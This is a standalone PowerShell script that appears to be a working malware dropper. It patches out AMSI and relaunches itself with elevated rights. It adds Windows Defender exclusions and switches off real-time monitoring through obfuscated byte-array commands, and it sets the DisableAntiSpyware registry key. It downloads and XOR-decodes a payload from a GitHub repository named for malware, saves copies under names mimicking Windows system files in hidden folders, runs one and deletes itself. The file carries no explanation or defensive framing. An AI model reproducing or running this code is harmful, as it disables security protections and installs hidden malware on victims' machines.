try{
$a=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.Location.Split('\')[-1] -eq 'System.Management.Automation.dll'}
$c=$a.GetType(([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))))
$f=$c.GetField(([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ='))),'NonPublic,Static')
$f.SetValue($null,$true)
}catch{}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(544)) {
	$t = Join-Path $env:LOCALAPPDATA 'wsync.ps1'
	if ($PSCommandPath) {
		Copy-Item $PSCommandPath $t -Force -EA 0
	} else {
		try {
			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
			(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/woohoomalware/WeAreDanger/refs/heads/main/final.ps1', $t)
		} catch { exit }
	}
	try { Start-Process powershell ("-NoP -EP Bypass -W 1 -File `"$t`"") -Verb RunAs } catch {}
	Exit
}

$base = 'https://github.com/woohoomalware/WeAreDanger/raw/refs/heads/main/'
$dirs = @(
	(Join-Path $env:LOCALAPPDATA 'Microsoft\OneDrive\setup'),
	(Join-Path $env:APPDATA 'Microsoft\Windows\Security'),
	(Join-Path $env:LOCALAPPDATA 'Microsoft\Protect\S-1-5-18')
)
$names = @('TextInputHost.exe','SecurityHealthHost.exe','WmiApSrv.exe')

try {
	$xb=[Text.Encoding]::UTF8.GetString([byte[]]@(65,100,100,45,77,112,80,114,101,102,101,114,101,110,99,101))
	$xp=[Text.Encoding]::UTF8.GetString([byte[]]@(45,69,120,99,108,117,115,105,111,110,80,97,116,104))
	$xe=[Text.Encoding]::UTF8.GetString([byte[]]@(45,69,120,99,108,117,115,105,111,110,80,114,111,99,101,115,115))
	foreach ($d in $dirs) { & ([scriptblock]::Create("$xb $xp '$d' -Force -EA 0")) }
	foreach ($n in $names) { & ([scriptblock]::Create("$xb $xe '$n' -Force -EA 0")) }
	& ([scriptblock]::Create("$xb $xp '$env:TEMP' -Force -EA 0"))
	$sb=[Text.Encoding]::UTF8.GetString([byte[]]@(83,101,116,45,77,112,80,114,101,102,101,114,101,110,99,101))
	$dr=[Text.Encoding]::UTF8.GetString([byte[]]@(45,68,105,115,97,98,108,101,82,101,97,108,116,105,109,101,77,111,110,105,116,111,114,105,110,103))
	$db=[Text.Encoding]::UTF8.GetString([byte[]]@(45,68,105,115,97,98,108,101,66,101,104,97,118,105,111,114,77,111,110,105,116,111,114,105,110,103))
	$di=[Text.Encoding]::UTF8.GetString([byte[]]@(45,68,105,115,97,98,108,101,73,79,65,86,80,114,111,116,101,99,116,105,111,110))
	$df=[Text.Encoding]::UTF8.GetString([byte[]]@(45,68,105,115,97,98,108,101,66,108,111,99,107,65,116,70,105,114,115,116,83,101,101,110))
	foreach($x in @($dr,$db,$di,$df)){& ([scriptblock]::Create("$sb $x `$true -Force -EA 0"))}
}
catch {}
$rk=[Text.Encoding]::UTF8.GetString([byte[]]@(72,75,76,77,92,83,79,70,84,87,65,82,69,92,80,111,108,105,99,105,101,115,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,68,101,102,101,110,100,101,114))
reg add $rk /v DisableAntiSpyware /t REG_DWORD /d 1 /f >$null 2>&1
Start-Sleep 2

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
$encP = $null; $encC = $null
try { $encP = $wc.DownloadData($base + 'payload.dat') } catch {}
try { $encC = $wc.DownloadData($base + 'config.dat') } catch {}
if (-not $encP -or $encP.Length -lt 1024) {
	$c = 'cu'+'rl.exe'; $t1="$env:TEMP\~pd.tmp"; $t2="$env:TEMP\~cd.tmp"
	& $c -L -s -k --max-time 120 -o $t1 ($base+'payload.dat') 2>$null
	& $c -L -s -k --max-time 30 -o $t2 ($base+'config.dat') 2>$null
	if (Test-Path $t1){$encP=[IO.File]::ReadAllBytes($t1);Remove-Item $t1 -Force -EA 0}
	if (Test-Path $t2){$encC=[IO.File]::ReadAllBytes($t2);Remove-Item $t2 -Force -EA 0}
}
if (-not $encP -or $encP.Length -lt 1024) { exit }

$key=[byte]0xAD; $dec=New-Object byte[] $encP.Length
for($i=0;$i -lt $encP.Length;$i++){$dec[$i]=$encP[$i] -bxor ($key -bxor (($i -band 0xFF)*0x4B -band 0xFF))}
$ms=New-Object IO.MemoryStream(,$dec);$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)
$os=New-Object IO.MemoryStream;$gs.CopyTo($os);$payload=$os.ToArray();$gs.Close();$ms.Close();$os.Close()
$config=$null
if($encC -and $encC.Length -gt 0){$ek=[byte]0xCE;$config=New-Object byte[] $encC.Length
for($i=0;$i -lt $encC.Length;$i++){$config[$i]=$encC[$i] -bxor ($ek -bxor (($i -band 0xFF)*0x3D -band 0xFF))}}

for($i=0;$i -lt $dirs.Count;$i++){try{
	New-Item $dirs[$i] -ItemType Directory -Force -EA 0|Out-Null
	$p=Join-Path $dirs[$i] $names[$i];[IO.File]::WriteAllBytes($p,$payload)
	if($config){[IO.File]::WriteAllBytes((Join-Path $dirs[$i] '.env'),$config)}
	Remove-Item ($p+':Zone.Identifier') -Force -EA 0
	$a='att'+'rib.exe';& $a +H +S $dirs[$i] 2>$null;& $a +H +S $p 2>$null
}catch{}}

$primary=Join-Path $dirs[0] $names[0]
if(Test-Path $primary){& cmd.exe /C start "" "$primary"}
Start-Sleep 3

Remove-Item (Join-Path $env:LOCALAPPDATA 'wsync.ps1') -Force -EA 0
if ($PSCommandPath) { 
	Start-Process ('cm'+'d.exe') ("/C ping 127.0.0.1 -n 3 >nul & del /f /q `"$PSCommandPath`"") -WindowStyle Hidden 
}
exit
